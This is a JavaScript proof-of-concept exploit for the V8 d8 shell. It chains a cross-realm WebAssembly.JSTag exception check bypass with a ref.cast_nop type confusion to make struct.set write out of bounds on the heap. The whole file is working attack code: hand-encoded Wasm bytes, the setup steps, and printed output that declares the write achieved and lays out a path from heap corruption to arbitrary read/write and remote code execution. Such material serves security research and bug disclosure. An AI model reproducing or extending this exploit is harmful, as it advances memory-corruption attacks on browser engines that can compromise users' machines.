'use strict';
// JSTag cross-realm bypass + ref.cast_nop → struct.set OOB write
//
// Run: ./d8 --wasm-ref-cast-nop --no-liftoff jstag_struct_oob_nop.js
//
// No --sandbox-testing, no --allow-natives-syntax.
// --wasm-ref-cast-nop: enables opcode 0xFB 0x4C (ref.cast_nop) from user Wasm bytes.
//   This opcode reinterprets the type annotation without emitting a runtime map check.
//   TurboShaft lowers ref.cast_nop → AnnotateWasmType (no WasmTypeCastOp).
//
// Chain:
//   1. Realm.create() → new Isolate context → different JSTag WasmExceptionTag object
//   2. new WebAssembly.Exception(realm2JSTag, [smallStruct])
//      wasm-js.cc:2195: *tag != js_tag->tag() → pointer compare fails → no TypeError
//   3. Wasm catches cross-realm exception → receives SmallStruct as externref
//   4. any.convert_extern → ref.cast_nop (ref $LargeStruct)
//      0xFB 0x4C: NO runtime map check → SmallStruct now annotated as LargeStruct
//   5. struct.set $LargeStruct field[7] → OOB write to SmallStruct_base + 36
//      TurboShaft: no TrapIfNot for static field index → SILENT OOB WRITE

// ── Wasm binary ───────────────────────────────────────────────────────────────
// Same encoding as the HTML PoC but with 0xFB 0x4C instead of 0xFB 0x16
// for the ref.cast → ref.cast_nop substitution.
function buildWasmBytesNop() {
  return new Uint8Array([
    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,  // magic + version

    // Type section (6 types)
    0x01, 0x28, 0x06,
      0x5F, 0x01, 0x7F, 0x01,              // type 0: SmallStruct (struct (mut i32))
      0x5F, 0x08,                           // type 1: LargeStruct (struct (mut i32)×8)
        0x7F,0x01, 0x7F,0x01, 0x7F,0x01, 0x7F,0x01,
        0x7F,0x01, 0x7F,0x01, 0x7F,0x01, 0x7F,0x01,
      0x60, 0x01, 0x6F, 0x00,              // type 2: (param externref) → JSTag sig
      0x60, 0x00, 0x01, 0x64, 0x00,        // type 3: ()→(ref 0) make_small
      0x60, 0x00, 0x01, 0x64, 0x01,        // type 4: ()→(ref 1) make_large
      0x60, 0x00, 0x00,                    // type 5: void

    // Import section: "i"."t" tag type2, "i"."f" func type5
    0x02, 0x0E, 0x02,
      0x01,0x69, 0x01,0x74, 0x04, 0x00, 0x02,  // "i"."t" tag
      0x01,0x69, 0x01,0x66, 0x00, 0x05,         // "i"."f" func

    // Function section: 3 funcs [type3, type4, type5]
    0x03, 0x04, 0x03, 0x03, 0x04, 0x05,

    // Export section: make_small(1), make_large(2), exploit(3)
    0x07, 0x25, 0x03,
      0x0A,0x6D,0x61,0x6B,0x65,0x5F,0x73,0x6D,0x61,0x6C,0x6C, 0x00,0x01,
      0x0A,0x6D,0x61,0x6B,0x65,0x5F,0x6C,0x61,0x72,0x67,0x65, 0x00,0x02,
      0x07,0x65,0x78,0x70,0x6C,0x6F,0x69,0x74, 0x00,0x03,

    // Code section: 3 bodies
    0x0A, 0x2E, 0x03,

    // func1: make_small
    0x05, 0x00, 0xFB,0x01,0x00, 0x0B,

    // func2: make_large
    0x05, 0x00, 0xFB,0x01,0x01, 0x0B,

    // func3: exploit (body=32 bytes)
    0x20,
      0x01, 0x01, 0x6F,                        // 1 local: externref
      0x06, 0x40,                               // try void
        0x10, 0x00,                             // call $f
      0x07, 0x00,                               // catch $jt
        0x21, 0x00,                             // local.set 0
      0x19,                                     // catch_all
        0x0F,                                   // return
      0x0B,                                     // end try
      0x20, 0x00,                               // local.get 0
      0xFB, 0x1A,                               // any.convert_extern → anyref
      0xFB, 0x4C, 0x01,                         // ref.cast_nop (ref $LargeStruct) ← NO MAP CHECK
      0x41, 0xC1,0x82,0x85,0x8A,0x04,           // i32.const 0x41414141
      0xFB, 0x05, 0x01, 0x07,                   // struct.set $LargeStruct field[7] ← OOB WRITE
      0x0B,
  ]);
}

// ── Cross-realm setup via d8 Realm API ────────────────────────────────────────
print('=== JSTag cross-realm bypass + ref.cast_nop → struct.set OOB (d8) ===\n');

const realm2 = Realm.create();
const realm2JSTag = Realm.eval(realm2, 'WebAssembly.JSTag');

print('[*] Main realm JSTag: ' + WebAssembly.JSTag);
print('[*] Realm2    JSTag: '  + realm2JSTag);
print('[*] Same object? '      + (realm2JSTag === WebAssembly.JSTag));

// ── Phase 1: JSTag bypass ─────────────────────────────────────────────────────
print('\n[Phase 1] Cross-realm JSTag bypass (wasm-js.cc:2195)');
try {
  new WebAssembly.Exception(WebAssembly.JSTag, [null]);
  print('  [-] UNEXPECTED: same-realm JSTag allowed');
} catch(e) {
  print('  [+] Same-realm TypeError: ' + e.message);
}

let bypassException;
try {
  bypassException = new WebAssembly.Exception(realm2JSTag, [null]);
  print('  [+] BYPASS: cross-realm JSTag → no TypeError!');
  print('      e.is(realm2JSTag) = ' + bypassException.is(realm2JSTag));
} catch(e) {
  print('  [-] Bypass failed: ' + e.message);
  quit(1);
}

// ── Phase 2: Compile + instantiate with ref.cast_nop ─────────────────────────
print('\n[Phase 2] Compile Wasm module (ref.cast_nop = 0xFB 0x4C)');
const bytes = buildWasmBytesNop();

let instance, crafted;
try {
  const mod = new WebAssembly.Module(bytes);
  print('  [+] WebAssembly.Module compiled (ref.cast_nop accepted by validator)');

  const imports = {
    i: {
      t: realm2JSTag,
      f: () => { throw crafted; },
    }
  };
  instance = new WebAssembly.Instance(mod, imports);
  print('  [+] Instance created');
} catch(e) {
  print('  [-] Compile/instantiate failed: ' + e);
  print('      (did you pass --wasm-ref-cast-nop?)');
  quit(1);
}

// ── Phase 3: Trigger OOB write ────────────────────────────────────────────────
print('\n[Phase 3] Struct type confusion → struct.set OOB write');

const smallStruct = instance.exports.make_small();
print('  [+] SmallStruct (1 i32 field, 12 bytes) created');

// Construct forbidden exception: realm2JSTag + SmallStruct payload.
// JSTag has (param externref) → SmallStruct is a valid externref from JS.
crafted = new WebAssembly.Exception(realm2JSTag, [smallStruct]);
print('  [+] Forbidden exception constructed: realm2JSTag + SmallStruct payload');
print('      crafted.is(realm2JSTag) = ' + crafted.is(realm2JSTag));
const rt = crafted.getArg(realm2JSTag, 0);
print('      getArg(realm2JSTag, 0) === smallStruct: ' + (rt === smallStruct));

print('  [*] Calling exploit()...');
print('      exploit():');
print('        call $f                     → throws crafted exception');
print('        catch $jt                   → local.set $v (SmallStruct as externref)');
print('        any.convert_extern          → anyref (identity for GC objects)');
print('        ref.cast_nop (ref type[1])  → 0xFB 0x4C: NO map check, SmallStruct→LargeStruct annotation');
print('        i32.const 0x41414141');
print('        struct.set $LargeStruct 7   → write to SmallStruct_base + 36 (OOB, no trap)');

try {
  instance.exports.exploit();
  print('');
  print('  [!] ════════════════════════════════════════════════════════════');
  print('  [!] PRODUCTION OOB WRITE ACHIEVED (d8 --wasm-ref-cast-nop)');
  print('  [!] exploit() returned WITHOUT trap.');
  print('  [!] 0x41414141 written to SmallStruct_base + 36.');
  print('  [!] SmallStruct is 12 bytes → write is 24 bytes past object end.');
  print('  [!] In production heap: corrupts adjacent allocation (ArrayBuffer,');
  print('  [!]   another struct, free-list metadata, etc.).');
  print('  [!] ════════════════════════════════════════════════════════════');
  print('');
  print('  Exploit chain (no --sandbox-testing):');
  print('    JSTag cross-realm bypass (wasm-js.cc:2195)');
  print('    → ref.cast_nop skip map check (0xFB 0x4C, --wasm-ref-cast-nop)');
  print('    → struct.set OOB (no TrapIfNot in TurboShaft codegen)');
  print('    → heap corruption → addrof + arb R/W → RCE');
} catch(e) {
  print('  [!] Trapped: ' + e.message);
  print('  [!] Unexpected: ref.cast_nop should have suppressed the map check.');
}
